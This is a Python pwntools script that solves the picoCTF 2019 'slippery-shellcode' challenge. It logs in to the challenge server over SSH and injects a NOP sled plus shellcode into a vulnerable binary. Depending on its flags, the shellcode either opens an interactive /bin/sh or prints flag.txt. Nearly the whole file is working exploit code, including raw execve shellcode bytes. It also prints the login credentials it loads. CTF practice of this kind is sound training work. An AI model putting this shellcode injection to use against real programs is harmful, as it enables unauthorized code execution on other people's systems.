from pwn import *
import json

LOCAL = False
PAYLOAD = False
SHELL = False
CAT = True

local_bin = "./vuln"

if(LOCAL):
    p = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/slippery-shellcode_0_7440dd178b8f0686410008ac1268d808'
    with open("../../creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    p.sendline('./vuln')


#Shellcode I got from shellstorm db
if(PAYLOAD):
    nop = '\x90'*300
    payload = nop+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    print p.recvline().decode()
    p.sendline(payload)
    p.interactive()
    exit()

#Using Shellcraft library from pwntools to start a shell
elif(SHELL):
    nop = '\x90'*300
    payload = nop + asm(shellcraft.i386.linux.sh())
    print p.recvline().decode()
    p.sendline(payload)
    p.interactive()
    exit()

#using shellcraft library from pwntools to just cat the flag
elif(CAT):
    nop = '\x90'*300
    payload = nop+asm(shellcraft.i386.linux.cat('flag.txt'))
    print p.recvline().decode()
    p.sendline(payload)
    print p.recv()
    exit()
